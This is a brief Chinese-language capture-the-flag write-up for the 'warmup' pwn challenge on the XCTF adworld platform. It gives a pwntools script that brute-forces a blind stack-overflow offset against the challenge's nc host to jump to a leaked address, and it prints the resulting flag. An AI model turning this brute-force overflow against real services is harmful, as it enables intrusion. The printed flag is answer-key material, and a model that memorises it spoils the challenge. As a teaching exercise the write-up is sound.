# warmup

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=eafaad26-42f6-41b4-a06c-a924e04dd90e_2)

第一次见这种题，没有给程序，盲打，还挺好玩的。

题目只给了个nc地址连上去后就给了个地址，肯定是有用的。

- nc 61.147.171.105 50483
    > -Warm Up-
    <br>WOW:0x40060d

输入%p没有得到回复，不是格式化字符串。基础pwn还剩个栈溢出，就是不知道是32位还是64位，溢出的偏移是多少也不知道。那就写个脚本跑跑。

```python
from pwn import *
addr = 0x40060d
def send_payload(proc,i,j):
    payload=b'a'*i
    if j==0:
        payload+=p32(addr)
    else:
        payload+=p64(addr)
    proc.sendlineafter(">",payload)
for i in range(100):
    for j in range(2):
        try:
            proc=remote("61.147.171.105",50483)
            send_payload(proc,i,j)
            message=proc.recv()
            print(f'message:{message},i:{i},j:{j}')
            proc.interactive()
        except:
            proc.close()
```

由于在输入错误的payload时车程序不会有任何反应，直接给EOF，所以我们可以利用这点判断什么是成功的payload。recv方法在收到EOF时会报错，正好被我们的try捕捉。recvline，recvall这类的方法都不会报错，所以不能在这里使用。最后在i=72，j=1时拿到了flag。

- ### Flag
- > cyberpeace{507e87a5ba19f87a1c118be62ee35808}